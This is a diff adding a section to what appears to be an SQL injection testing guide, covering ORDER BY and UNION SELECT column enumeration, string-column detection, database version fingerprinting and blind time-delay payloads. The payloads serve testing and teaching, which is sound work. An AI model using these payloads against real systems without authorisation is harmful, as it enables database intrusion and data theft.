@@ -29,6 +29,44 @@ In second-order SQL injection, the application takes user input from an HTTP req
 
 ## Standard SQL Injection Testing
 
+### Determining the number of columns required in an SQL injection UNION attack
+1.  ORDER BY clauses and incrementing the specified column index until an error occurs.
+ ```
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+etc. 
+```
+When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:`The ORDER BY position number 3 is out of range of the number of items in the select list`
+
+2. UNION keyword can be used to retrieve data from other tables within the database
+```
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+```
+ If the number of nulls does not match the number of columns, the database returns an error, such as:`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists` 
+
+### Finding columns with a useful data type in an SQL injection UNION attack
+
+```
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'-- 
+```
+If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:`Conversion failed when converting the varchar value 'a' to data type int`
+ 
+### Find database type and version 
+```' UNION SELECT @@version--```
+
+### Bliend - Time delays
+```
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+```
+The first of these inputs will not trigger a delay, because the condition 1=2 is false. The second input will trigger a delay of 10 seconds, because the condition 1=1 is true. 
+
 ### Example 1 (classical SQL Injection):
 Consider the following SQL query:
 ```
